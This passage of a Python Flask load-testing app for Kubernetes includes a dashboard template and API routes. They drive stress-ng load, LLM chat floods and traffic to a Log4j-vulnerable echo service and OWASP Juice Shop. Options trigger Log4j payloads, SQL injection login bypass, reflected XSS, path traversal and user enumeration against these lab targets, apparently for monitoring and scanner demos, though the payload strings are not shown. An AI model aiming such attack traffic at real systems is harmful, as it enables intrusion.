        .status-warn { background: rgba(243,156,18,0.15); border: 1px solid rgba(243,156,18,0.3); color: #f39c12; }

        @media (max-width: 600px) {
            .form-grid { grid-template-columns: 1fr; }
            .mgrid { grid-template-columns: repeat(2, 1fr); }
        }
    </style>
</head>
<body>
<div class="container">

    <div class="header">
        <h1>Load Testing Application</h1>
        <div class="sub">v3.2 &mdash; Kubernetes Load Generator for Turbonomic &amp; Instana</div>
        <div class="pod-info">Pod: {{ pod_name }} | Node: {{ node_name }} | Echo: {{ echo_url }} | Juice: {{ juice_url }}</div>
    </div>

    <!-- LIVE METRICS -->
    <div class="card">
        <h2>System &amp; Application Metrics</h2>
        <div class="mgrid">
            <div class="mbox"><div class="val">{{ m.cpu_usage|round(1) }}%</div><div class="lbl">CPU Usage</div></div>
            <div class="mbox"><div class="val">{{ m.memory_usage|round(1) }}%</div><div class="lbl">Memory Usage</div></div>
            <div class="mbox"><div class="val">{{ active_jobs }}</div><div class="lbl">Active Jobs</div></div>
            <div class="mbox"><div class="val">{{ m.stress_tests_started }}</div><div class="lbl">Stress Started</div></div>
            <div class="mbox"><div class="val">{{ m.stress_tests_completed }}</div><div class="lbl">Stress Done</div></div>
            <div class="mbox"><div class="val">{{ m.echo_requests_total }}</div><div class="lbl">Echo Total</div></div>
            <div class="mbox"><div class="val">{{ m.echo_requests_success }}</div><div class="lbl">Echo OK</div></div>
            <div class="mbox"><div class="val">{{ m.echo_requests_failed }}</div><div class="lbl">Echo Fail</div></div>
            <div class="mbox"><div class="val">{{ m.avg_echo_response_time_ms }}ms</div><div class="lbl">Avg Response</div></div>
            <div class="mbox"><div class="val">{{ m.echo_flood_requests }}</div><div class="lbl">Flood Reqs</div></div>
            <div class="mbox"><div class="val">{{ m.juice_requests_total }}</div><div class="lbl">Juice Total</div></div>
            <div class="mbox"><div class="val">{{ m.juice_requests_success }}</div><div class="lbl">Juice OK</div></div>
            <div class="mbox"><div class="val">{{ m.juice_requests_failed }}</div><div class="lbl">Juice Fail</div></div>
            <div class="mbox"><div class="val">{{ m.juice_flood_requests }}</div><div class="lbl">Juice Flood</div></div>
            <div class="mbox"><div class="val">{{ m.avg_juice_response_time_ms }}ms</div><div class="lbl">Avg Juice ms</div></div>
        </div>
    </div>

    <!-- ACTIVE JOBS (this pod) -->
    {% if jobs %}
    <div class="card">
        <h2>Active Jobs on {{ pod_name }}</h2>
        {% for j in jobs %}
        <div class="job-row" style="flex-wrap:wrap;">
            <div>
                <span class="tag tag-{{ j.type }}">{{ j.type }}</span>
                <span style="margin-left:10px;">{{ j.job_id }}</span>
                <span style="color:#5c6d7e; margin-left:10px; font-size:0.85em;">since {{ j.started }}</span>
            </div>
            <div style="display:flex; align-items:center; gap:10px;">
                {% if j.params %}
                <span style="color:#8899a6; font-size:0.82em;">
                    {% if j.params.cpu_workers is defined %}CPU: {{ 'all' if j.params.cpu_workers == 0 else j.params.cpu_workers }}{% endif %}
                    {% if j.params.duration is defined %} | {{ j.params.duration }}s{% endif %}
                    {% if j.params.memory_workers is defined and j.params.memory_workers > 0 %} | Mem: {{ j.params.memory_workers }}x{{ j.params.memory_size|default('256M') }}{% endif %}
                    {% if j.params.rps is defined %}{{ j.params.rps }} rps | {{ j.params.duration }}s{% endif %}
                    {% if j.params.rpm is defined %}{{ j.params.rpm|round(1) }} req/min | {{ j.params.duration }}s{% endif %}
                    {% if j.params.max_workers is defined %}max {{ j.params.max_workers }} workers | {{ j.params.steps|default('') }} steps{% endif %}
                </span>
                {% endif %}
                <button class="btn btn-danger btn-sm" onclick="stopJob('{{ j.job_id }}')">Stop</button>
            </div>
        </div>
        {% endfor %}
        <div style="margin-top:12px;">
            <button class="btn btn-danger" onclick="stopAll()">Stop All Jobs</button>
        </div>
    </div>
    {% endif %}

    <!-- LOAD GENERATION TABS -->
    <div class="card">
        <h2>Load Generation</h2>
        <div class="tabs">
            <div class="tab active" onclick="switchTab(event,'tab-stress')">Stress Test</div>
            <div class="tab" onclick="switchTab(event,'tab-ramp')">Ramp Up</div>
            <div class="tab" onclick="switchTab(event,'tab-wave')">Wave Pattern</div>
            <div class="tab" onclick="switchTab(event,'tab-echo')">Echo Service</div>
            <div class="tab" onclick="switchTab(event,'tab-flood')">Echo Flood</div>
            <div class="tab" onclick="switchTab(event,'tab-juice')">Juice Shop</div>
            <div class="tab" onclick="switchTab(event,'tab-juiceflood')">Juice Flood</div>
            <div class="tab" onclick="switchTab(event,'tab-chat')">LLM Chat</div>
        </div>

        <!-- STRESS TEST -->
        <div id="tab-stress" class="tab-content active">
            <p style="color:#8899a6; margin-bottom:16px;">Constant CPU &amp; memory load via stress-ng</p>
            <form id="form-stress" onsubmit="return submitForm(this, '/api/stress')">
                <div class="form-grid">
                    <div class="fg"><label>CPU Workers</label>
                        <select name="cpu_workers">
                            <option value="0" selected>Auto (all CPUs)</option>
                            <option value="1">1 Worker</option>
                            <option value="2">2 Workers</option>
                            <option value="4">4 Workers</option>
                            <option value="6">6 Workers</option>
                            <option value="8">8 Workers</option>
                            <option value="16">16 Workers</option>
                        </select>
                    </div>
                    <div class="fg"><label>Memory Workers</label><input type="number" name="memory_workers" value="0" min="0" max="4"></div>
                    <div class="fg"><label>Duration (sec)</label><input type="number" name="duration" value="60" min="5" max="3600"></div>
                    <div class="fg"><label>Memory Size</label>
                        <select name="memory_size">
                            <option value="128M">128 MB</option>
                            <option value="256M" selected>256 MB</option>
                            <option value="512M">512 MB</option>
                        </select>
                    </div>
                    <div class="fg"><label>Repeat (jobs)</label><input type="number" name="_repeat" value="1" min="1" max="8"></div>
                </div>
                <button type="submit" class="btn btn-primary">Start Stress Test</button>
            </form>
        </div>

        <!-- RAMP UP -->
        <div id="tab-ramp" class="tab-content">
            <p style="color:#8899a6; margin-bottom:16px;">Linearly increase CPU workers in steps (great for Turbonomic scaling tests)</p>
            <form id="form-ramp" onsubmit="return submitForm(this, '/api/ramp')">
                <div class="form-grid">
                    <div class="fg"><label>Max CPU Workers</label><input type="number" name="max_workers" value="8" min="1" max="16"></div>
                    <div class="fg"><label>Step Duration (sec)</label><input type="number" name="step_duration" value="20" min="5" max="300"></div>
                    <div class="fg"><label>Number of Steps</label><input type="number" name="steps" value="5" min="2" max="20"></div>
                    <div class="fg"><label>Memory Size</label>
                        <select name="memory_size">
                            <option value="128M">128 MB</option>
                            <option value="256M" selected>256 MB</option>
                            <option value="512M">512 MB</option>
                        </select>
                    </div>
                </div>
                <button type="submit" class="btn btn-warning">Start Ramp Up</button>
            </form>
        </div>

        <!-- WAVE -->
        <div id="tab-wave" class="tab-content">
            <p style="color:#8899a6; margin-bottom:16px;">Sine-wave oscillating CPU load &mdash; simulates realistic traffic patterns</p>
            <form id="form-wave" onsubmit="return submitForm(this, '/api/wave')">
                <div class="form-grid">
                    <div class="fg"><label>Max CPU Workers</label><input type="number" name="max_workers" value="8" min="1" max="16"></div>
                    <div class="fg"><label>Wave Period (sec)</label><input type="number" name="period_sec" value="60" min="20" max="600"></div>
                    <div class="fg"><label>Total Duration (sec)</label><input type="number" name="total_duration" value="180" min="30" max="3600"></div>
                    <div class="fg"><label>Memory Size</label>
                        <select name="memory_size">
                            <option value="128M">128 MB</option>
                            <option value="256M" selected>256 MB</option>
                            <option value="512M">512 MB</option>
                        </select>
                    </div>
                </div>
                <button type="submit" class="btn btn-purple">Start Wave</button>
            </form>
        </div>

        <!-- ECHO SERVICE SINGLE -->
        <div id="tab-echo" class="tab-content">
            <p style="color:#8899a6; margin-bottom:16px;">Send a single request to the vulnerable Java Echo Service (Log4j CVE-2021-44228)</p>
            <form id="form-echo" onsubmit="return submitForm(this, '/api/echo')">
                <div class="fg"><label>Message</label><input type="text" name="message" value="Hello from Load Test v3.2" style="max-width:500px;"></div>
                <div class="form-grid">
                    <div class="fg"><label>HTTP Method</label>
                        <select name="method">
                            <option value="POST" selected>POST</option>
                            <option value="GET">GET</option>
                        </select>
                    </div>
                </div>
                <div class="cb-row">
                    <input type="checkbox" name="vulnerable_payload" value="true" id="vuln1">
                    <label for="vuln1" style="color:#e74c3c;">Include Log4j vulnerable payload</label>
                </div>
                <button type="submit" class="btn btn-danger">Call Echo Service</button>
            </form>
        </div>

        <!-- ECHO FLOOD -->
        <div id="tab-flood" class="tab-content">
            <p style="color:#8899a6; margin-bottom:16px;">Sustained echo service load &mdash; generates continuous network traffic and logging</p>
            <form id="form-flood" onsubmit="return submitForm(this, '/api/flood')">
                <div class="form-grid">
                    <div class="fg"><label>Requests / sec</label><input type="number" name="rps" value="5" min="1" max="100"></div>
                    <div class="fg"><label>Duration (sec)</label><input type="number" name="duration" value="60" min="5" max="3600"></div>
                </div>
                <div class="cb-row">
                    <input type="checkbox" name="vulnerable" value="true" id="vuln2">
                    <label for="vuln2" style="color:#e74c3c;">Include Log4j vulnerable payloads</label>
                </div>
                <button type="submit" class="btn btn-success">Start Echo Flood</button>
            </form>
        </div>

        <!-- JUICE SHOP SINGLE -->
        <div id="tab-juice" class="tab-content">
            <p style="color:#8899a6; margin-bottom:16px;">Send a single request to OWASP Juice Shop. Pick a benign browse or an attack pattern that ZAP scans will pick up.</p>
            <form id="form-juice" onsubmit="return submitForm(this, '/api/juice')">
                <div class="form-grid">
                    <div class="fg"><label>Action</label>
                        <select name="action">
                            <option value="browse">Browse home page</option>
                            <option value="products">List products (REST API)</option>
                            <option value="search">Search products (clean)</option>
                            <option value="feedbacks">List feedbacks</option>
                            <option value="users">Enumerate users (IDOR)</option>
                            <option value="challenges">List CTF challenges</option>
                            <option value="sqli_login">SQL injection login bypass</option>
                            <option value="xss_search">Reflected XSS via search</option>
                            <option value="path_traversal">Path traversal attempt</option>
                            <option value="admin_section">Hit admin section</option>
                        </select>
                    </div>
                </div>
                <button type="submit" class="btn btn-danger">Call Juice Shop</button>
            </form>
        </div>

        <!-- JUICE FLOOD -->
        <div id="tab-juiceflood" class="tab-content">
            <p style="color:#8899a6; margin-bottom:16px;">Sustained traffic against Juice Shop &mdash; useful for Instana traces, Turbonomic scaling tests, and continuous DAST surface generation.</p>
            <form id="form-juiceflood" onsubmit="return submitForm(this, '/api/juiceflood')">
                <div class="form-grid">
                    <div class="fg"><label>Pattern</label>
                        <select name="action">
                            <option value="mixed" selected>Mixed (browse + attacks rotated)</option>
                            <option value="browse">Browse only</option>
                            <option value="products">Product API only</option>
                            <option value="search">Search only</option>
                            <option value="sqli_login">SQL injection only</option>
                            <option value="xss_search">XSS search only</option>
                            <option value="users">Enumerate users only</option>
                        </select>
                    </div>
                    <div class="fg"><label>Requests / sec</label><input type="number" name="rps" value="3" min="1" max="50"></div>
                    <div class="fg"><label>Duration (sec)</label><input type="number" name="duration" value="120" min="5" max="3600"></div>
                </div>
                <button type="submit" class="btn btn-success">Start Juice Flood</button>
            </form>
        </div>

        <!-- LLM CHAT -->
        <div id="tab-chat" class="tab-content">
            <p style="color:#8899a6; margin-bottom:16px;">Drive the LLM chat service (&rarr; vLLM / Ollama / OpenAI). Requests are trace-propagated, so Instana shows one end-to-end trace <b>load-test-app &rarr; chat-app &rarr; LLM</b> with the GenAI span under this app.</p>
            <form id="form-chatllm" onsubmit="return submitForm(this, '/api/chatllm')">
                <div class="fg"><label>Prompt (single call)</label><input type="text" name="prompt" value="In one sentence, what is observability?" style="max-width:560px;"></div>
                <button type="submit" class="btn btn-primary">Ask Once</button>
            </form>
            <hr style="border-color:rgba(255,255,255,0.1); margin:20px 0;">
            <form id="form-chatflood" onsubmit="return submitForm(this, '/api/chatflood')">
                <p style="color:#8899a6; margin-bottom:12px;">Sustained chat load (leave prompt empty to rotate through demo prompts).</p>
                <div class="fg"><label>Prompt (optional)</label><input type="text" name="prompt" value="" placeholder="(rotate demo prompts)" style="max-width:560px;"></div>
                <div class="form-grid">
                    <div class="fg"><label>Requests / minute</label><input type="number" name="rpm" value="6" min="1" max="120"></div>
                    <div class="fg"><label>Duration (sec)</label><input type="number" name="duration" value="600" min="5" max="86400"></div>
                </div>
                <p style="color:#5c6d7e; font-size:0.85em; margin-bottom:12px;">Paced per minute &mdash; LLM calls take seconds, and a slow call consumes its interval rather than adding to it. 6/min = one every 10s.</p>
                <button type="submit" class="btn btn-success">Start Chat Flood</button>
            </form>
        </div>
    </div>

    <!-- CLUSTER STATUS -->
    <div class="card">
        <h2>Cluster-Wide Status</h2>
        {% if cluster.error %}
            <div class="status-banner status-warn">{{ cluster.details }}</div>
        {% else %}
            <div class="mgrid" style="max-width:400px;">
                <div class="mbox"><div class="val">{{ cluster.cluster_total }}</div><div class="lbl">Cluster Active Jobs</div></div>
                <div class="mbox"><div class="val">{{ cluster.per_pod|length }}</div><div class="lbl">Pods Reporting</div></div>
            </div>
            {% if cluster.per_pod %}
            <div style="margin-top:14px;">
                {% for p in cluster.per_pod %}
                <div style="margin-bottom:12px;">
                    <div class="job-row">
                        <span>{{ p.pod_name }}</span>
                        <span style="color:#5c6d7e;">{{ p.node_name }}</span>
                        <span style="color:#00d2ff; font-weight:600;">{{ p.active_jobs }} jobs</span>
                    </div>
                    {% if p.jobs %}
                    {% for j in p.jobs %}
                    <div style="margin-left:20px; padding:6px 14px; font-size:0.85em; color:#8899a6; border-left:2px solid rgba(0,210,255,0.2);">
                        <span class="tag tag-{{ j.type }}" style="font-size:0.75em;">{{ j.type }}</span>
                        <span style="margin-left:8px;">{{ j.job_id }}</span>
                        {% if j.params %}
                        <span style="margin-left:8px; color:#5c6d7e;">
                            {% if j.params.cpu_workers is defined %}CPU: {{ 'all' if j.params.cpu_workers == 0 else j.params.cpu_workers }}{% endif %}
                            {% if j.params.duration is defined %} | {{ j.params.duration }}s{% endif %}
                            {% if j.params.memory_workers is defined and j.params.memory_workers > 0 %} | Mem: {{ j.params.memory_workers }}{% endif %}
                            {% if j.params.rps is defined %}{{ j.params.rps }} rps | {{ j.params.duration }}s{% endif %}
                            {% if j.params.max_workers is defined %}max {{ j.params.max_workers }} workers{% endif %}
                        </span>
                        {% endif %}
                    </div>
                    {% endfor %}
                    {% endif %}
                </div>
                {% endfor %}
            </div>
            {% endif %}
        {% endif %}

    {% if cluster.pod_resources %}
    <div style="margin-top:20px;">
        <h2 style="font-size:1.3em; color:#00d2ff; margin-bottom:16px; border-bottom:1px solid rgba(0,210,255,0.2); padding-bottom:10px;">Pod Resource Usage</h2>
        <table style="width:100%; border-collapse: collapse;">
            <thead>
                <tr style="background:rgba(44,62,80,0.6); text-align:left;">
                    <th style="padding:10px; border-bottom:1px solid #34495e;">Pod Name</th>
                    <th style="padding:10px; border-bottom:1px solid #34495e;">Node</th>
                    <th style="padding:10px; border-bottom:1px solid #34495e;">CPU %</th>
                    <th style="padding:10px; border-bottom:1px solid #34495e;">Memory %</th>
                    <th style="padding:10px; border-bottom:1px solid #34495e;">CPUs</th>
                    <th style="padding:10px; border-bottom:1px solid #34495e;">Total RAM</th>
                </tr>
            </thead>
            <tbody>
                {% for pod in cluster.pod_resources %}
                <tr style="border-bottom:1px solid #34495e;">
                    <td style="padding:10px; font-family:monospace; font-size:0.85em;">{{ pod.name }}</td>
                    <td style="padding:10px; color:#8899a6;">{{ pod.node }}</td>
                    <td style="padding:10px; font-weight:bold; color:{% if pod.cpu_percent > 80 %}#e74c3c{% elif pod.cpu_percent > 50 %}#f39c12{% else %}#2ecc71{% endif %};">{{ pod.cpu_percent|round(1) }}%</td>
                    <td style="padding:10px; font-weight:bold; color:{% if pod.memory_percent > 80 %}#e74c3c{% elif pod.memory_percent > 50 %}#f39c12{% else %}#2ecc71{% endif %};">{{ pod.memory_percent|round(1) }}%</td>
                    <td style="padding:10px; color:#8899a6;">{{ pod.cpu_count }}</td>
                    <td style="padding:10px; color:#8899a6;">{{ pod.memory_total_gb }} GB</td>
                </tr>
                {% endfor %}
            </tbody>
        </table>
    </div>
    {% endif %}
    </div>

    <!-- API REFERENCE -->
    <div class="card">
        <h2>API Reference</h2>
        <div class="endpoint"><span class="method">GET</span> / &mdash; Web dashboard</div>
        <div class="endpoint"><span class="method">GET</span> /health &mdash; Kubernetes health check</div>
        <div class="endpoint"><span class="method">GET</span> /metrics &mdash; Prometheus-style metrics</div>
        <div class="endpoint"><span class="method">GET</span> /status &mdash; Pod status &amp; active jobs</div>
        <div class="endpoint"><span class="method post">POST</span> /api/stress &mdash; Start stress test</div>
        <div class="endpoint"><span class="method post">POST</span> /api/ramp &mdash; Start ramp-up pattern</div>
        <div class="endpoint"><span class="method post">POST</span> /api/wave &mdash; Start wave pattern</div>
        <div class="endpoint"><span class="method post">POST</span> /api/echo &mdash; Single echo call</div>
        <div class="endpoint"><span class="method post">POST</span> /api/flood &mdash; Start echo flood</div>
        <div class="endpoint"><span class="method post">POST</span> /api/juice &mdash; Single Juice Shop request (action selectable)</div>
        <div class="endpoint"><span class="method post">POST</span> /api/juiceflood &mdash; Start Juice Shop sustained traffic</div>
        <div class="endpoint"><span class="method post">POST</span> /api/stop &mdash; Stop all jobs</div>
        <div class="endpoint"><span class="method post">POST</span> /api/stop/&lt;job_id&gt; &mdash; Stop specific job</div>
        <div class="endpoint"><span class="method">GET</span> /cluster-status &mdash; Cluster-wide status</div>
    </div>
</div>

<div id="toast" style="display:none; position:fixed; bottom:20px; right:20px; padding:14px 24px;
    border-radius:8px; font-size:0.92em; z-index:999; max-width:400px;
    box-shadow:0 4px 12px rgba(0,0,0,0.4); transition:opacity 0.3s;"></div>

<script>
function switchTab(e, id) {
    document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
    document.querySelectorAll('.tab-content').forEach(t => t.classList.remove('active'));
    e.target.classList.add('active');
    document.getElementById(id).classList.add('active');
    try { localStorage.setItem('activeTab', id); } catch (err) {}
}

// Restore the last-selected tab after the periodic auto-refresh, so selecting
// e.g. "LLM Chat" isn't reset back to "Stress Test" on reload.
function restoreTab() {
    var id; try { id = localStorage.getItem('activeTab'); } catch (err) {}
    var content = id && document.getElementById(id);
    if (!content) return;
    document.querySelectorAll('.tab').forEach(function(t){ t.classList.remove('active'); });
    document.querySelectorAll('.tab-content').forEach(function(t){ t.classList.remove('active'); });
    content.classList.add('active');
    document.querySelectorAll('.tab').forEach(function(t){
        var oc = t.getAttribute('onclick') || '';
        if (oc.indexOf("'" + id + "'") !== -1) t.classList.add('active');
    });
}

function showToast(msg, ok) {
    var t = document.getElementById('toast');
    t.textContent = msg;
    t.style.background = ok ? 'rgba(46,204,113,0.9)' : 'rgba(231,76,60,0.9)';
    t.style.color = '#fff';
    t.style.display = 'block';
    t.style.opacity = '1';
    clearTimeout(t._timer);
    t._timer = setTimeout(function(){ t.style.opacity='0'; setTimeout(function(){ t.style.display='none'; },300); }, 3000);
}

function submitForm(form, url) {
    var fd = new FormData(form);
    var repeat = parseInt(fd.get('_repeat')) || 1;
    fd.delete('_repeat');
    var body = {};
    fd.forEach(function(v,k){ body[k] = v; });
    var started = 0;
    for (var i = 0; i < repeat; i++) {
        fetch(url, {
            method: 'POST',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(body)
        }).then(function(r){ return r.json(); }).then(function(d){
            started++;
            if (d.error) { showToast(d.error, false); }
            else { showToast((d.message || 'OK') + (d.job_id ? ' (' + d.job_id + ')' : '') + (repeat > 1 ? ' [' + started + '/' + repeat + ']' : ''), true); }
            if (started >= repeat) { setTimeout(function(){ location.reload(); }, 1000); }
        }).catch(function(e){ showToast('Request failed: ' + e, false); });
    }
    return false;
}

function stopAll() {
    if (!confirm('Stop ALL active jobs?')) return;
    fetch('/stop', {method:'POST'}).then(function(r){return r.json();}).then(function(d){
        showToast(d.message, true); setTimeout(function(){ location.reload(); }, 1000);
    });
}

function stopJob(jid) {
    fetch('/stop/'+jid, {method:'POST'}).then(function(r){return r.json();}).then(function(d){
        showToast(d.message, true); setTimeout(function(){ location.reload(); }, 1000);
    });
}

// Restore the selected tab on (re)load.
restoreTab();

// Auto-refresh every 15s for live metrics — but don't reload while the user is
// typing in a field (e.g. an LLM Chat prompt); defer until they're done.
function scheduleRefresh() {
    setTimeout(function () {
        var el = document.activeElement, tag = el && el.tagName;
        if (tag === 'INPUT' || tag === 'TEXTAREA' || tag === 'SELECT') {
            scheduleRefresh();   // user is interacting — try again later
        } else {
            location.reload();
        }
    }, 15000);
}
scheduleRefresh();
</script>
</body>
</html>
"""

# ============================================================================
# FLASK ROUTES
# ============================================================================

@app.route('/')
def index():
    inc_metric('requests_total')
    m = get_metrics_snapshot()
    jobs = get_active_jobs_info()
    cluster = get_cluster_stress_status()
    return render_template_string(
        HTML_TEMPLATE,
        m=m, jobs=jobs, active_jobs=len(jobs),
        cluster=cluster,
        pod_name=POD_NAME, node_name=NODE_NAME,
        echo_url=ECHO_SERVICE_URL,
        juice_url=JUICE_SHOP_URL,
    )

@app.route('/health')
def health():
    return jsonify({
        'status': 'healthy',
        'version': '3.2.0',
        'pod': POD_NAME,
        'timestamp': datetime.now().isoformat(),
    })

@app.route('/metrics')
def prometheus_metrics():
    inc_metric('requests_total')
    sys_m = collect_system_metrics()
    m = get_metrics_snapshot()
    return jsonify({
        'application': m,
        'system': sys_m,
        'active_jobs': len(get_active_jobs_info()),
    })

@app.route('/status')
def status():
    inc_metric('requests_total')
    m = get_metrics_snapshot()
    return jsonify({
        'pod_name': POD_NAME,
        'node_name': NODE_NAME,
        'active_jobs': len(get_active_jobs_info()),
        'jobs': get_active_jobs_info(),
        'metrics': m,
        'system': {
            'cpu_count': psutil.cpu_count(),
            'memory_total_gb': round(psutil.virtual_memory().total / (1024**3), 2),
        },
        'timestamp': datetime.now().isoformat(),
    })

@app.route('/cluster-status')
def cluster_status_route():
    inc_metric('requests_total')
    return jsonify(get_cluster_stress_status())

# --- Action endpoints (all POST, return JSON, redirect for browser) ---

def _form_or_json():
    if request.is_json:
        return request.get_json()
    return request.form.to_dict()

def _respond(data, status_code=200):
    if request.is_json or request.content_type == 'application/json':
        return jsonify(data), status_code
    # Browser redirect with flash-style message
    msg = data.get('message') or data.get('error') or json.dumps(data)
    return f"""<html><body style="font-family:sans-serif;background:#0f2027;color:#e0e0e0;padding:40px;">
        <div style="max-width:600px;margin:0 auto;background:rgba(255,255,255,0.06);padding:24px;border-radius:12px;">
        <h2>{'Error' if status_code >= 400 else 'OK'}</h2>
        <pre style="white-space:pre-wrap;">{json.dumps(data, indent=2)}</pre>
        <a href="/" style="color:#00d2ff;">Back to Dashboard</a>
        </div>
        <script>setTimeout(()=>window.location.href='/',5000);</script>
        </body></html>""", status_code


@app.route('/api/stress', methods=['POST'])
@app.route('/stress', methods=['GET', 'POST'])
def api_stress():
    inc_metric('requests_total')
    if request.method == 'GET':
        return index()  # show dashboard

    d = _form_or_json()
    jid, err = start_stress(
        cpu_workers=int(d.get('cpu_workers', 2)),
        memory_workers=int(d.get('memory_workers', 1)),
        duration=min(int(d.get('duration', 60)), 3600),
        memory_size=d.get('memory_size', '256M'),
    )
    if err:
        return _respond({'error': err}, 429)
    return _respond({'message': 'Stress test started', 'job_id': jid})


@app.route('/api/ramp', methods=['POST'])
@app.route('/ramp', methods=['POST'])
def api_ramp():
    inc_metric('requests_total')
    d = _form_or_json()
    jid, err = start_ramp(
        max_workers=int(d.get('max_workers', 8)),
        step_duration=int(d.get('step_duration', 20)),
        steps=int(d.get('steps', 5)),
        memory_size=d.get('memory_size', '256M'),
    )
    if err:
        return _respond({'error': err}, 429)
    return _respond({'message': 'Ramp started', 'job_id': jid})


@app.route('/api/wave', methods=['POST'])
@app.route('/wave', methods=['POST'])
def api_wave():
    inc_metric('requests_total')
    d = _form_or_json()
    jid, err = start_wave(
        max_workers=int(d.get('max_workers', 8)),
        period_sec=int(d.get('period_sec', 60)),
        total_duration=min(int(d.get('total_duration', 180)), 3600),
        memory_size=d.get('memory_size', '256M'),
    )
    if err:
        return _respond({'error': err}, 429)
    return _respond({'message': 'Wave started', 'job_id': jid})


@app.route('/api/echo', methods=['POST'])
@app.route('/echo', methods=['POST'])
def api_echo():
    inc_metric('requests_total')
    d = _form_or_json()
    result = call_echo_service(
        message=d.get('message', 'Hello from Load Test v3.2'),
        method=d.get('method', 'POST'),
        vulnerable_payload=d.get('vulnerable_payload') == 'true',
    )
    return _respond(result, 200 if result['success'] else 502)


@app.route('/api/flood', methods=['POST'])
@app.route('/flood', methods=['POST'])
def api_flood():
    inc_metric('requests_total')
    d = _form_or_json()
    jid, err = start_echo_flood(
        rps=min(int(d.get('rps', 5)), 100),
        duration=min(int(d.get('duration', 60)), 3600),
        vulnerable=d.get('vulnerable') == 'true',
    )
    if err:
        return _respond({'error': err}, 429)
    return _respond({'message': 'Echo flood started', 'job_id': jid})


@app.route('/api/juice', methods=['POST'])
@app.route('/juice', methods=['POST'])
def api_juice():
    inc_metric('requests_total')
    d = _form_or_json()
    action = d.get('action', 'browse')
    if action not in JUICE_ACTIONS:
        return _respond({'error': f'Unknown action: {action}',
                         'available': sorted(JUICE_ACTIONS.keys())}, 400)
    result = call_juice_shop(action=action)
    return _respond(result, 200 if result['success'] else 502)


@app.route('/api/juiceflood', methods=['POST'])
@app.route('/juiceflood', methods=['POST'])
def api_juiceflood():
    inc_metric('requests_total')
    d = _form_or_json()
    action = d.get('action', 'mixed')
    if action != 'mixed' and action not in JUICE_ACTIONS:
        return _respond({'error': f'Unknown action: {action}',
                         'available': ['mixed'] + sorted(JUICE_ACTIONS.keys())}, 400)
    jid, err = start_juice_flood(
        rps=min(int(d.get('rps', 3)), 50),
        duration=min(int(d.get('duration', 120)), 3600),
        action=action,
    )
    if err:
        return _respond({'error': err}, 429)
    return _respond({'message': 'Juice flood started',
                     'job_id': jid, 'action': action})


@app.route('/api/chatllm', methods=['POST'])
@app.route('/chatllm', methods=['POST'])
def api_chatllm():
    inc_metric('requests_total')
    d = _form_or_json()
    prompt = d.get('prompt') or 'In one sentence, what is observability?'
    result = call_chat_service(prompt=prompt, model=d.get('model'))
    return _respond(result, 200 if result.get('success') else 502)


@app.route('/api/chatflood', methods=['POST'])
@app.route('/chatflood', methods=['POST'])
def api_chatflood():
    inc_metric('requests_total')
    d = _form_or_json()
    prompt = d.get('prompt') or None   # None -> rotate through DEFAULT_CHAT_PROMPTS
    rpm = d.get('rpm')
    if rpm in (None, ''):
        # backwards compatible: older callers sent requests/second
        rpm = float(d.get('rps') or 0.1) * 60
    rpm = min(max(float(rpm), 0.2), 120)
    jid, err = start_chat_flood(
        rpm=rpm,
        duration=min(int(d.get('duration', 300)), 86400),
        prompt=prompt,
    )
    if err:
        return _respond({'error': err}, 429)
    return _respond({'message': 'Chat flood started', 'job_id': jid,
                     'rpm': rpm, 'interval_seconds': round(60.0 / rpm, 1)})


@app.route('/api/stop', methods=['POST'])
@app.route('/stop', methods=['POST'])
def api_stop():
    n = stop_all_jobs()
    return _respond({'message': f'{n} job(s) stopped'})


@app.route('/api/stop/<job_id>', methods=['POST'])
@app.route('/stop/<job_id>', methods=['POST'])
def api_stop_job(job_id):
    ok = stop_job(job_id)
    if ok:
        return _respond({'message': f'Job {job_id} stopped'})
    return _respond({'error': f'Job {job_id} not found'}, 404)


# ============================================================================
# MAIN
# ============================================================================
if __name__ == '__main__':
    # Start background metrics collector
    threading.Thread(target=_metrics_loop, daemon=True).start()

    port = int(os.environ.get('PORT', 8080))
    host = os.environ.get('HOST', '0.0.0.0')

    logger.info(f"Starting Load Testing Application v3.2 on {host}:{port}")
    logger.info(f"Echo Service: {ECHO_SERVICE_URL}")
    logger.info(f"Juice Shop:   {JUICE_SHOP_URL}")

    if os.environ.get('FLASK_ENV') == 'production':
        try:
            from waitress import serve
            logger.info("Using Waitress production server")
            serve(app, host=host, port=port, threads=8)
        except ImportError:
            logger.warning("Waitress not available, using Flask dev server")
            app.run(host=host, port=port, debug=False, threaded=True)
    else:
        app.run(host=host, port=port, debug=False, threaded=True)
